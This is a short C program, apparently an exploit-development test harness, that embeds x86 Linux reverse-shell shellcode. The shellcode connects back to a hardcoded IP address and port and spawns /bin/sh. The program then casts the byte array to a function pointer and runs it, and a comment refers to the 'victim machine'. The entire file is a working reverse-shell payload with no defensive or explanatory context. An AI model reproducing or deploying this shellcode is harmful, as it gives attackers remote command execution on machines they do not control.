#include <stdio.h>
#include <string.h>


#define PORT "\xad\x9c"		// 33333 in regular order, can be configured to any open port on victim machine
#define IP "\xc0\xa8\x01\x72"	// 192.168.1.114

unsigned char shellcode[] = \
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\xb3\x03\x68"
IP
"\x66\x68"
PORT
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x0b\x31\xff\x57\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x57\x53\x89\xe1\x57\x89\xe2\xcd\x80";

int main(void)
{
	printf("[*] Length of shellcode: %d\n\n", strlen(shellcode));
	
	int (*ret)() = (int (*)())shellcode;
	
	printf("[*] Running shellcode...");
	
	ret();

}




